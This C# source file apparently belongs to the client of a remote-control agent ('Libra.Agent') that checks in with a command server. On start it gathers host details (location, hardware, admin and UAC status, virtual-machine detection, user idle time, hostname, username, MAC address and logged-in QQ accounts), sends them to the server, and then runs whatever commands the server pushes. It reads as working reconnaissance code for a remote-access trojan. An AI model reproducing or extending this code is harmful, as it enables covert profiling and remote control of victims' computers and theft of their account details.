using Libra.Agent.Handle;
using Libra.Virgo;
using Libra.Virgo.Enum;
using Libra.Virgo.Models;
using Libra.Virgo.Models.MessageType;
using Newtonsoft.Json;
using System.Text.Json;

namespace Libra.Agent
{
    public static class Runtimes
    {
        public static VirgoClient? VirgoClient { get; private set; }
        public static string AgentId { get; private set; } = Guid.NewGuid().ToString();

        public static async Task Initialize(string serverIp = "127.0.0.1", int serverPort = 8888)
        {
            if (VirgoClient == null)
            {
                VirgoClient = new VirgoClient();

                VirgoClient.MessageReceived += async (dataJson, type) =>
                {
                    Console.WriteLine($"收到服务器消息: {type}");

                    await MainHandle.Handle(dataJson, type);
                };

                var city = await Libra.Agent.Models.InfoHelper.GetCity();
                var cpuInfo = Libra.Agent.Models.InfoHelper.GetCpuInfo();
                var memoryInfo = Libra.Agent.Models.InfoHelper.GetPhysicalMemory();
                var gpuInfo = Libra.Agent.Models.InfoHelper.GetGpuNames();
                var diskInfo = Libra.Agent.Models.InfoHelper.Drives();
                var bootTime = Libra.Agent.Models.InfoHelper.GetBootTime();
                var lastActiveTime = Libra.Agent.Models.InfoHelper.MouseTracker.GetLastActiveTime();
                var isIdle = Libra.Agent.Models.InfoHelper.MouseTracker.IsIdle();
                var uacStatus = Libra.Agent.Models.InfoHelper.GetUacStatus();
                var vmInfo = Libra.Agent.Models.InfoHelper.GetVirtualMachineInfo();

                var agentInfo = new AgentInfo
                {
                    AgentId = Guid.Parse(AgentId),
                    ProcessName = System.Diagnostics.Process.GetCurrentProcess().ProcessName,
                    OsVersion = Libra.Agent.Models.InfoHelper.GetSystemVersion(),
                    QQAccounts = Libra.Agent.Models.InfoHelper.GetQQList().ToList(),
                    Network = new()
                    {
                        MacAddress = GetMacAddress(),
                        Hostname = Environment.MachineName,
                        Username = Environment.UserName
                    },
                    Privilege = new()
                    {
                        IsAdmin = IsRunningAsAdmin(),
                        UacEnabled = uacStatus
                    },
                    LastHeartbeat = DateTime.UtcNow,
                    StartTime = DateTime.Now,
                    BootTime = bootTime,
                    LastActiveTime = lastActiveTime,
                    IsIdle = isIdle,
                    Location = city.country + " " + city.city.Replace("’","'"),
                    Hardware = new()
                    {
                        Cpu = cpuInfo,
                        Memory = memoryInfo,
                        Gpus = gpuInfo,
                        Disks = diskInfo.Cast<object>().ToList(),
                        IsVirtualMachine = vmInfo.IsVirtualMachine,
                        VmType = vmInfo.VmType,
                        Cameras = []
                    }
                };

                await VirgoClient.ConnectAsync(serverIp, serverPort, agentInfo, CancellationToken.None);
                Console.WriteLine("连接成功并注册完成");
            }
        }

        public static async Task<bool> SendMessage(VirgoMessageType messageType, object data)
        {
            if (VirgoClient == null)
            {
                return false;
            }

            try
            {
                await VirgoClient.SendAsync(data, messageType, CancellationToken.None);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"发送消息出错: {ex.Message}");
                return false;
            }
        }

        private static string GetMacAddress()
        {
            try
            {
                var networkInterfaces = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces();
                var ethernetInterface = networkInterfaces.FirstOrDefault(nic => 
                    nic.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up &&
                    nic.NetworkInterfaceType == System.Net.NetworkInformation.NetworkInterfaceType.Ethernet);
                
                if (ethernetInterface != null)
                {
                    return BitConverter.ToString(ethernetInterface.GetPhysicalAddress().GetAddressBytes()).Replace("-", ":");
                }
                return "00:00:00:00:00:00";
            }
            catch
            {
                return "00:00:00:00:00:00";
            }
        }

        private static bool IsRunningAsAdmin()
        {
            try
            {
                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }
    }
}